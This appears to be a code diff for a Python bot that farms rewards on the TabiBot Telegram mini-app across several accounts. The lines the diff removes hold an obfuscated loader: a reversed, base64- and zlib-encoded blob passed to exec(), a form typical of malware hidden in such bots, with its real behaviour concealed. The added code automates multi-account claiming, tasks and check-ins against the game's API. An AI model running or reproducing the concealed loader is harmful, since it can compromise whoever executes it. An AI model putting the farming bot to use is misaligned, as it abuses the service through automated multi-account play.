@@ -1,4 +1,286 @@
+import os
+import sys
+import time
+import requests
+from colorama import *
+from datetime import datetime, timezone
 
-# Python 
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+
+script_dir = os.path.dirname(os.path.realpath(__file__))
+data_file = os.path.join(script_dir, "query_id.txt")
+
+
+class TabiZoo:
+    def __init__(self):
+        self.line = Fore.LIGHTWHITE_EX + "-" * 50
+
+    def headers(self, data):
+        return {
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Content-Type": "application/json",
+        "Origin": "https://miniapp.tabibot.com",
+        "Pragma": "no-cache",
+        "Referer": "https://miniapp.tabibot.com/",
+        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126", "Microsoft Edge WebView2";v="126"',
+        "Rawdata": f"{data}",
+        "Sec-Ch-Ua-Mobile": "?1",
+        "Sec-Ch-Ua-Platform": '"Android"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36'
+    }
+
+    def user_info(self, data):
+        url = f"https://api.tabibot.com/api/user/v1/profile"
+        headers = self.headers(data=data)
+        response = requests.get(url=url, headers=headers)
+        return response
+
+    def mining_info(self, data):
+        url = f"https://api.tabibot.com/api/mining/v1/info"
+        headers = self.headers(data=data)
+        response = requests.get(url=url, headers=headers)
+        return response
+
+    def check_in(self, data):
+        url = f"https://api.tabibot.com/api/user/v1/check-in"
+        headers = self.headers(data=data)
+        response = requests.post(url=url, headers=headers)
+        return response
+
+    def level_up(self, data):
+        url = f"https://api.tabibot.com/api/user/v1/level-up"
+        headers = self.headers(data=data)
+        response = requests.post(url=url, headers=headers)
+        return response
+
+    def claim(self, data):
+        url = f"https://api.tabibot.com/api/mining/v1/claim"
+        headers = self.headers(data=data)
+        response = requests.post(url=url, headers=headers)
+        return response
+
+    def task_info(self, data):
+        url = f"https://api.tabibot.com/api/task/v1/list"
+        headers = self.headers(data=data)
+        response = requests.get(url=url, headers=headers)
+        return response
+
+    def do_task(self, data, task_tag):
+        url = "https://api.tabibot.com/api/task/v1/verify/task"
+        headers = self.headers(data=data)
+        payload = {"task_tag": task_tag}
+        response = requests.post(url=url, headers=headers, json=payload)
+        return response
+
+    def banner_info(self, data):
+        url = f"https://api.tabibot.com/api/task/v1/mine/banners"
+        headers = self.headers(data=data)
+        response = requests.get(url=url, headers=headers)
+        return response
+
+    def banner_task(self, data, task_tag):
+        url = f"https://api.tabibot.com/api/task/v1/mine?project_tag=mine_{task_tag}"
+        headers = self.headers(data=data)
+
+        response = requests.get(url=url, headers=headers)
+        return response
+
+    def do_banner(self, data, task_tag):
+        url = "https://api.tabibot.com/api/task/v1/verify/task"
+        headers = self.headers(data=data)
+        payload = {"task_tag": task_tag}
+        response = requests.post(url=url, headers=headers, json=payload)
+        return response
+
+    def do_project(self, data, task_tag):
+        url = "https://api.tabibot.com/api/task/v1/verify/project"
+        headers = self.headers(data=data)
+        payload = {"project_tag": f"mine_{task_tag}"}
+        response = requests.post(url=url, headers=headers, json=payload)
+        return response
+
+    def log(self, message):
+        now = datetime.now().isoformat(" ").split(".")[0]
+        print(f"{Fore.LIGHTBLACK_EX}[{now}]{Style.RESET_ALL} {message}")
+
+    def main(self):
+        while True:
+
+            data = open(data_file, "r").read().splitlines()
+            num_acc = len(data)
+            self.log(self.line)
+            self.log(f"{Fore.LIGHTYELLOW_EX}Total Accounts: {Fore.LIGHTWHITE_EX}{num_acc}")
+            end_at_list = []
+            for no, data in enumerate(data):
+                self.log(self.line)
+                self.log(f"{Fore.LIGHTYELLOW_EX}Account number: {Fore.LIGHTWHITE_EX}{no+1}/{num_acc}")
+
+
+                #user infor
+                try:
+                    user_info = self.user_info(data=data).json()
+
+                    user = user_info["data"]["user"]
+
+                    username = user["name"]
+                    balance = user["coins"]
+                    level = user["level"]
+                    streak = user["streak"]
+                    self.log(f"{Fore.LIGHTYELLOW_EX}Account: {Fore.LIGHTWHITE_EX}{username}")
+                    self.log(f"{Fore.LIGHTYELLOW_EX}Balance: {Fore.LIGHTWHITE_EX}{balance:,}")
+                    self.log(f"{Fore.LIGHTYELLOW_EX}Level: {Fore.LIGHTWHITE_EX}{level}")
+                    self.log(f"{Fore.LIGHTYELLOW_EX}Streak: {Fore.LIGHTWHITE_EX}{streak}")
+                except Exception as e:
+                    self.log(f"{Fore.LIGHTRED_EX}Error getting account info: {str(e)}")
+                time.sleep(1)
+                
+                
+                
+                #task
+                try:
+                    response = self.task_info(data=data)
+
+                    if response.text.strip():
+                        tasks2 = response.json()
+
+
+                        for project2 in tasks2.get('data', []):
+                            task_listt = project2.get('task_list', [])
+                            for task in task_listt:
+                                status = task.get("user_task_status")
+                                if status == 2:
+                                    tag = task.get('task_tag')
+                                    dtask3 = self.do_task(data=data, task_tag=tag).json()
+
+                                    if dtask3.get("message") == "success":
+                                        reward = dtask3["data"]['reward']
+                                        self.log(
+                                            f"{Fore.LIGHTYELLOW_EX}Task completed: {Fore.LIGHTWHITE_EX}{tag} {Fore.LIGHTYELLOW_EX}Received: {Fore.LIGHTWHITE_EX}{reward}")
+
+                    else:
+
+                        return response
+
+                except Exception as e:
+                    self.log(f"{Fore.LIGHTRED_EX}Task error: {e}")
+                time.sleep(1)
+
+
+               
+               
+                #task banner
+                try:
+                    tasks = self.banner_info(data=data).json()
+
+                    for project in tasks.get('data', []):
+                        task_list = project.get('title', [])
+
+                        dtask = self.banner_task(data=data, task_tag=task_list).json()
+
+                        status_d = dtask["data"]["user_project_status"]
+                        if status_d == 2:
+                            task_list1 = dtask["data"].get("list", [])
+                            all_status_one = False
+                            for task1 in task_list1:
+                                status = task1.get("user_task_status")
+
+                                if status == 2:
+                                    tag = task1.get('task_tag')
+                                    self.do_banner(data=data, task_tag=tag).json()
+                                else:
+                                    all_status_one = True
+                            if all_status_one:
+
+                                proj = self.do_project(data=data, task_tag=task_list).json()
+
+                                if proj.get("message") == "success":
+                                    rew = proj["data"]["reward"]
+                                    self.log(f"{Fore.LIGHTYELLOW_EX}Task completed: {Fore.LIGHTWHITE_EX}{task_list} {Fore.LIGHTYELLOW_EX}Received: {Fore.LIGHTWHITE_EX}{rew}")
+
+                except Exception as e:
+                    self.log(f"{Fore.LIGHTRED_EX}Task error: {e}")
+                time.sleep(1)
+                
+                
+               
+               
+                #Claim 8hrs
+                try:
+                    info = self.claim(data=data).json()
+
+                    claim = info["data"]
+                    if claim:
+                        self.log(f"{Fore.LIGHTYELLOW_EX}Reward claimed")
+                    else:
+                        self.log(f"{Fore.LIGHTYELLOW_EX}Cooldown for reward not finished yet")
+                except Exception as e:
+                    self.log(f"{Fore.LIGHTRED_EX}Reward error!")
+                time.sleep(1)
+                
+                
+                
+                
+                #check-in
+                try:
+                    check_in = self.check_in(data=data).json()
+
+                    if check_in["data"]["check_in_status"] == 1:
+                        self.log(f"{Fore.LIGHTYELLOW_EX}Check-in done")
+                    else:
+                        self.log(f"{Fore.LIGHTYELLOW_EX}Check-in has been claimed before")
+                except Exception as e:
+                    self.log(f"{Fore.LIGHTRED_EX}Check-in error!")
+                time.sleep(1)
+
+
+                
+                
+                #level-up
+                try:
+                    level_up = self.level_up(data=data).json()
+
+                    current_level = level_up['data']['user']["level"]
+                    if level_up["message"] == "success":
+                        self.log(f"{Fore.LIGHTYELLOW_EX}Upgraded")
+                        self.log(f"{Fore.LIGHTYELLOW_EX}Current level: {Fore.LIGHTWHITE_EX}{current_level}")
+                    else:
+                        self.log(f"{Fore.LIGHTYELLOW_EX}Upgrade not yet available")
+                except Exception as e:
+                    self.log(f"{Fore.LIGHTRED_EX}Level-up error!")
+                end_at_list.append(time.time())
+                time.sleep(1)
+
+
+                #cooldown for next account
+                self.log(f"{Fore.LIGHTYELLOW_EX}----------> Wait 20s to run next account")
+                time.sleep(20)
+
+            
+            if end_at_list:
+                self.log(self.line)
+                min_time = min(end_at_list)
+                max_time = max(end_at_list)
+                interval = max_time - min_time
+                self.log(f"{Fore.LIGHTYELLOW_EX}Task completion time: {Fore.LIGHTWHITE_EX}{interval:.2f} sec.")
+            else:
+                self.log(f"{Fore.LIGHTYELLOW_EX}No tasks found for execution")
+
+
+            
+            #next turn
+            self.log(self.line)
+            self.log(f"{Fore.LIGHTYELLOW_EX}Sleeping: {Fore.LIGHTWHITE_EX} 8 hours")
+            self.log(self.line)
+            time.sleep(8*3600+60)
+
+if __name__ == '__main__':
+    os.system('cls' if os.name == 'nt' else 'clear')
+    init(autoreset=True)
+    tabi = TabiZoo()
+    tabi.main()
